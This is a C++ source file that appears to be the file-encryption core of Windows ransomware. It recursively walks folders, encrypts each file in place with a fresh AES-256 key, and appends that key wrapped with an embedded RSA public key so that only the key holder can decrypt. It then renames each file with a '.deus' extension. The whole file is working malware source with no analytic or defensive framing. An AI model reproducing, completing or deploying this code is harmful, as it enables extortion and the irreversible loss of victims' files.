#include "Encrypter.h"
#include "Utils.h"
#include "Libs.h"

#include <string>
#include <windows.h>

int Encrypter::preprocessFile(std::wstring filePath, uint64_t* pfileSize, HANDLE* phFile) {
    Logging::INFO((L"Starting Encryption on file " + filePath).c_str());

    if (filePath.substr(filePath.find_last_of('.') + 1) == L"deus") {
        Logging::WARNING("File already encrypted");
        Logging::END();
        return 1;
    }

    *phFile = Libs::CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (*phFile == INVALID_HANDLE_VALUE) {
        Logging::WARNING(L"Could not open file" + filePath);
        return -1;
    }

    uint32_t lowFileSize = 0;
    uint32_t highFileSize = 0;

    lowFileSize = Libs::GetFileSize(*phFile, (LPDWORD)&highFileSize);

    *pfileSize = (((uint64_t)highFileSize) << 32) | lowFileSize;

    return 0;
}

int Encrypter::preprocessEncryption(HCRYPTPROV* phProv, HCRYPTKEY* phKey) {
    int ret = 0;

    ret = Libs::AcquireContext(phProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

    if (!ret) {
        Libs::ReleaseContext(*phProv, 0);
        return -1;
    }

    ret = Libs::GenKey(*phProv, CALG_AES_256, CRYPT_EXPORTABLE, phKey);

    if (!ret) {
        Libs::ReleaseContext(*phProv, 0);
        return -1;
    }

    return 0;
}

int Encrypter::encryptFile(std::wstring filePath) {
    int ret = 0;
    uint64_t fileSize = 0;
    HANDLE hFile = NULL;

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;

    ret = preprocessFile(filePath, &fileSize, &hFile);
    if (ret == 1)
        return 0;
    else if (ret != 0)
        return -1;

    ret = preprocessEncryption(&hProv, &hKey);
    if (ret != 0)
        return -1;

    uint64_t totalRead = 0;
    DWORD chunkWritten = 0;
    DWORD chunkRead = 0;
    DWORD chunkReadInitial = 0;

    const DWORD chunkSize = 1000000;
    uint8_t* chunk = (uint8_t*)malloc(chunkSize);

    int finalChunk = FALSE;

    do {
        ret = Libs::ReadFile(hFile, (LPVOID)chunk, chunkSize, &chunkRead, NULL);

        if (!ret) {
            Logging::ERR("Error reading file\n");
            free(chunk);
            Libs::CloseHandle(hFile);
            Libs::DestroyKey(hKey);
            Libs::ReleaseContext(hProv, 0);
            return -1;
        }

        chunkReadInitial = chunkRead;
        if (chunkRead < chunkSize)
            finalChunk = TRUE;

        ret = Libs::Encrypt(hKey, (HCRYPTHASH)NULL, finalChunk, 0, chunk, (DWORD*)&chunkRead, chunkSize);

        if (!ret) {
            Logging::ERR("Error encrypting chunk\n");
            free(chunk);
            Libs::CloseHandle(hFile);
            Libs::DestroyKey(hKey);
            Libs::ReleaseContext(hProv, 0);
            return -1;
        }

        Libs::SetFilePointer(hFile, -((int64_t)chunkReadInitial), NULL, FILE_CURRENT);
        ret = Libs::WriteFile(hFile, chunk, chunkRead, &chunkWritten, NULL);

        if (!ret) {
            Logging::ERR("Error writing chunk\n");
            free(chunk);
            Libs::CloseHandle(hFile);
            Libs::DestroyKey(hKey);
            Libs::ReleaseContext(hProv, 0);
            return -1;
        }
        totalRead += chunkRead;

        if (totalRead > fileSize)
            break;

    } while (chunkRead == chunkSize);

    DWORD writtenLen;
    const std::string DEUS = "DEUS";
    ret = Libs::WriteFile(hFile, DEUS.c_str(), (DWORD)DEUS.size(), &writtenLen, NULL);

    if (!ret) {
        Logging::ERR("Error writing chunk\n");
        free(chunk);
        Libs::CloseHandle(hFile);
        Libs::DestroyKey(hKey);
        Libs::ReleaseContext(hProv, 0);
        return -1;
    }

    HCRYPTKEY hPubKey;
    ret = Libs::ImportKey(hProv, m_pubKey, 2048 + 160, 0, 0, &hPubKey);

    if (!ret) {
        Logging::ERR("Error importing RSA Key");
        free(chunk);
        Libs::CloseHandle(hFile);
        Libs::DestroyKey(hKey);
        Libs::ReleaseContext(hProv, 0);
        return -1;
    }

    DWORD blobLen;
    DWORD blobWrittenLen;
    BYTE* pEncKeyBlob = NULL;

    ret = Libs::ExportKey(hKey, hPubKey, SIMPLEBLOB, 0, NULL, &blobLen);

    if (!ret) {
        free(chunk);
        Libs::CloseHandle(hFile);
        Libs::DestroyKey(hKey);
        Libs::DestroyKey(hPubKey);
        Libs::ReleaseContext(hProv, 0);
        return -1;
    }

    pEncKeyBlob = (LPBYTE)malloc(blobLen);

    ret = Libs::ExportKey(hKey, hPubKey, SIMPLEBLOB, 0, pEncKeyBlob, &blobLen);

    if (!ret) {
        free(pEncKeyBlob);
        free(chunk);
        Libs::CloseHandle(hFile);
        Libs::DestroyKey(hKey);
        Libs::DestroyKey(hPubKey);
        Libs::ReleaseContext(hProv, 0);
        return -1;
    }

    ret = Libs::WriteFile(hFile, pEncKeyBlob, blobLen, &blobWrittenLen, NULL);

    if (!ret) {
        Logging::ERR("Error writing encrypted key");
        free(pEncKeyBlob);
        free(chunk);
        Libs::CloseHandle(hFile);
        Libs::DestroyKey(hKey);
        Libs::DestroyKey(hPubKey);
        Libs::ReleaseContext(hProv, 0);
        return -1;
    }

    Libs::CloseHandle(hFile);

    ret = Libs::MoveFileW(filePath.c_str(), (filePath + L".deus").c_str());

    if (!ret) {
        Logging::ERR("Error changing Extension");
        free(chunk);
        Libs::CloseHandle(hFile);
        Libs::DestroyKey(hKey);
        Libs::DestroyKey(hPubKey);
        Libs::ReleaseContext(hProv, 0);
        return -1;
    }

    Logging::INFO(L"Encrypted file " + filePath + L" successfully");
    Logging::END();

    free(pEncKeyBlob);
    free(chunk);
    Libs::DestroyKey(hKey);
    Libs::DestroyKey(hPubKey);
    Libs::ReleaseContext(hProv, 0);
    return 0;
}

int Encrypter::encryptFolder(std::wstring folderPath) {
    int ret = 0;
    WIN32_FIND_DATA ffd;
    HANDLE hFind = Libs::FindFirstFileW((LPCWSTR)(folderPath + L"\\*").c_str(), (LPWIN32_FIND_DATAW)&ffd);

    if (hFind == INVALID_HANDLE_VALUE) {
        Logging::ERR(L"Iteration over folder " + folderPath + L" failed\n");
        return -1;
    }

    do {
        if (wcscmp((wchar_t*)ffd.cFileName, L".") != 0 &&
            wcscmp((wchar_t*)ffd.cFileName, L"..") != 0) {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                ret = encryptFolder(folderPath + L"\\" + (wchar_t*)ffd.cFileName);
            } else {
                ret = encryptFile(folderPath + L"\\" + (wchar_t*)ffd.cFileName);
            }
        }

        if (ret != 0) {
            Logging::ERR(L"Error code: " + std::to_wstring(GetLastError()));
            Logging::END();
        }
    } while (Libs::FindNextFileW(hFind, (LPWIN32_FIND_DATAW)&ffd) != 0);

    Libs::FindClose(hFind);
    return 0;
}
